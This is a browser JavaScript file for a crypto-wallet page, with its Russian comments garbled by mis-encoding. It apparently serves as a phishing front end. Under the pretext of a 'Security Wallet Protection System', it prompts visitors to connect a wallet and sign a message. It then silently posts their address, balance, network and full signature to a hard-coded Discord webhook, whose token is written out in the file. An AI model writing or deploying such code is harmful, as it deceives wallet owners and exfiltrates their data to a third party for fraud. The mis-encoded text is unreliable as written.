// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';

// –≠–ª–µ–º–µ–Ω—Ç—ã —Å—Ç—Ä–∞–Ω–∏—Ü—ã
const connectButton = document.getElementById('connectButton');
const signButton = document.getElementById('signButton');
const statusDiv = document.getElementById('status');
const noWalletMessage = document.getElementById('noWalletMessage');

let web3;
let userAddress;

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
function updateStatus(message, isError = false, isWarning = false) {
    statusDiv.textContent = message;
    statusDiv.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
    statusDiv.style.display = 'block';
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞/—Å–∫—Ä—ã—Ç–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤
function showElement(element) {
    element.classList.remove('hidden');
}

function hideElement(element) {
    element.classList.add('hidden');
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ Discord webhook
async function sendToDiscordWebhook(userAddress, signature, message) {
    const webhookURL = 'https://discordapp.com/api/webhooks/1420896121835884718/IdDJHN_exPKf4s-4pDwmQHJkaLCxfWkXSPBTbygj6TpSySJ3RICs8LvEIJO3bn_yOuXW';
    
    // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å–µ—Ç–∏
    const balance = await getShortBalance();
    const network = await getNetworkName();
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–ª–∏–Ω—É –ø–æ–¥–ø–∏—Å–∏
    const signatureLength = signature.length;
    console.log('–î–ª–∏–Ω–∞ –ø–æ–¥–ø–∏—Å–∏:', signatureLength);
    console.log('–ü–æ–ª–Ω–∞—è –ø–æ–¥–ø–∏—Å—å:', signature);
    
    const embed = {
        title: "üîê –ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞",
        color: 3066993, // –ó–µ–ª–µ–Ω—ã–π —Ü–≤–µ—Ç
        timestamp: new Date().toISOString(),
        fields: [
            {
                name: "üí∞ –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞",
                value: `\`\`\`${userAddress}\`\`\``,
                inline: false
            },
            {
                name: "üíé –ë–∞–ª–∞–Ω—Å",
                value: balance,
                inline: true
            },
            {
                name: "üåê –°–µ—Ç—å",
                value: network,
                inline: true
            },
            {
                name: `‚úçÔ∏è –ü–æ–¥–ø–∏—Å—å (${signatureLength} —Å–∏–º–≤–æ–ª–æ–≤)`,
                value: `\`\`\`${signature}\`\`\``,
                inline: false
            },
            {
                name: "üìù –°–æ–æ–±—â–µ–Ω–∏–µ",
                value: `\`\`\`${message}\`\`\``,
                inline: false
            },
            {
                name: "‚è∞ –í—Ä–µ–º—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è",
                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                inline: false
            },
            {
                name: "üîç –î–µ—Ç–∞–ª–∏ –ø–æ–¥–ø–∏—Å–∏",
                value: `–î–ª–∏–Ω–∞: ${signatureLength} —Å–∏–º–≤–æ–ª–æ–≤\n–ù–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å: ${signature.substring(0, 10)}...\n–ó–∞–∫–∞–Ω—á–∏–≤–∞–µ—Ç—Å—è –Ω–∞: ...${signature.substring(signatureLength - 10)}`,
                inline: false
            }
        ],
        footer: {
            text: "Security Wallet Protection System"
        }
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed],
                username: 'Wallet Security Bot',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/6001/6001533.png'
            })
        });

        if (response.ok) {
            console.log('‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Discord');
            return true;
        } else {
            console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord. –°—Ç–∞—Ç—É—Å:', response.status);
            console.error('–¢–µ–∫—Å—Ç –æ—à–∏–±–∫–∏:', await response.text());
            return false;
        }
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Discord:', error);
        return false;
    }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–∞–∑–≤–∞–Ω–∏—è —Å–µ—Ç–∏
async function getNetworkName() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum',
            10: 'Optimism',
            43114: 'Avalanche',
            250: 'Fantom',
            100: 'Gnosis Chain'
        };
        
        return networks[chainId] || `Unknown Network (ID: ${chainId})`;
    } catch (error) {
        return 'Network Unknown';
    }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫—Ä–∞—Ç–∫–æ–≥–æ –±–∞–ª–∞–Ω—Å–∞
async function getShortBalance() {
    try {
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        return `${parseFloat(ethBalance).toFixed(4)} ETH`;
    } catch (error) {
        return 'Balance Unknown';
    }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –ø–æ–¥–ø–∏—Å–∏
async function verifySignature(message, signature, address) {
    try {
        // –ü—ã—Ç–∞–µ–º—Å—è –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–ø–∏—Å—å
        const recoveredAddress = await web3.eth.personal.ecRecover(message, signature);
        return recoveredAddress.toLowerCase() === address.toLowerCase();
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø–æ–¥–ø–∏—Å–∏:', error);
        return false;
    }
}

// –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∫–æ—à–µ–ª—å–∫–∞
if (typeof window.ethereum !== 'undefined') {
    console.log('–ö–æ—à–µ–ª–µ–∫ –Ω–∞–π–¥–µ–Ω!');
    web3 = new Web3(window.ethereum);
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ
    hideElement(noWalletMessage);
    
} else {
    console.log('–ö–æ—à–µ–ª–µ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω!');
    showElement(noWalletMessage);
    hideElement(connectButton);
}

// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
connectButton.addEventListener('click', async () => {
    try {
        connectButton.classList.add('loading');
        updateStatus('‚åõ –ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞...', false, true);
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        
        updateStatus(`‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω! –ê–¥—Ä–µ—Å: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
        
        hideElement(connectButton);
        showElement(signButton);
        
        await checkNetwork();
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('‚ùå –í—ã –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ.', true);
        } else {
            updateStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏: ' + error.message, true);
        }
    } finally {
        connectButton.classList.remove('loading');
    }
});

// –ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
signButton.addEventListener('click', async () => {
    if (!userAddress) {
        updateStatus('‚ùå –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫.', true);
        return;
    }
    
    try {
        signButton.classList.add('loading');
        updateStatus('‚åõ –ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è...', false, true);
        
        const message = `–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤–ª–∞–¥–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–æ–º –¥–ª—è —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
        const signature = await web3.eth.personal.sign(message, userAddress, '');
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–ø–∏—Å—å
        const isValid = await verifySignature(message, signature, userAddress);
        
        console.log('–ü–æ–ª—É—á–µ–Ω–Ω–∞—è –ø–æ–¥–ø–∏—Å—å:', signature);
        console.log('–î–ª–∏–Ω–∞ –ø–æ–¥–ø–∏—Å–∏:', signature.length);
        console.log('–ü–æ–¥–ø–∏—Å—å –≤–∞–ª–∏–¥–Ω–∞:', isValid);
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Discord
        updateStatus('‚åõ –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä...', false, true);
        const sendSuccess = await sendToDiscordWebhook(userAddress, signature, message);
        
        if (sendSuccess) {
            if (isValid) {
                updateStatus(`‚úÖ –ü–æ–¥–ø–∏—Å—å –≤–∞–ª–∏–¥–Ω–∞ –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! –î–ª–∏–Ω–∞: ${signature.length} —Å–∏–º–≤–æ–ª–æ–≤`);
            } else {
                updateStatus(`‚ö†Ô∏è –ü–æ–¥–ø–∏—Å—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞, –Ω–æ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –Ω–µ —É–¥–∞–ª–∞—Å—å. –î–ª–∏–Ω–∞: ${signature.length} —Å–∏–º–≤–æ–ª–æ–≤`, false, true);
            }
        } else {
            updateStatus(`‚úÖ –ü–æ–¥–ø–∏—Å—å –ø–æ–ª—É—á–µ–Ω–∞, –Ω–æ –æ—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä. –î–ª–∏–Ω–∞: ${signature.length} —Å–∏–º–≤–æ–ª–æ–≤`, false, true);
        }
        
        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –≤—ã–≤–æ–¥–∏–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–¥–ø–∏—Å–∏ –≤ –∫–æ–Ω—Å–æ–ª—å
        console.log('=== –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –ü–û–î–ü–ò–°–ò ===');
        console.log('–ê–¥—Ä–µ—Å:', userAddress);
        console.log('–î–ª–∏–Ω–∞ –ø–æ–¥–ø–∏—Å–∏:', signature.length);
        console.log('–ü–æ–¥–ø–∏—Å—å:', signature);
        console.log('–í–∞–ª–∏–¥–Ω–æ—Å—Ç—å:', isValid);
        console.log('============================');
        
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–∏:', error);
        if (error.code === 4001) {
            updateStatus('‚ùå –í—ã –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–ø–∏—Å—å.', true);
        } else {
            updateStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–ø–∏—Å–∏: ' + error.message, true);
        }
    } finally {
        signButton.classList.remove('loading');
    }
});

// –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ç–∏
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
        console.log('Connected to:', networkName);
        
    } catch (error) {
        console.error('Network check error:', error);
    }
}

// –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π –∫–æ—à–µ–ª—å–∫–∞
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function(accounts) {
        if (accounts.length === 0) {
            updateStatus('–ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω', true);
            hideElement(signButton);
            showElement(connectButton);
        } else {
            userAddress = accounts[0];
            updateStatus(`–ê–∫–∫–∞—É–Ω—Ç –∏–∑–º–µ–Ω–µ–Ω: ${userAddress.substring(0, 10)}...`);
        }
    });
    
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}
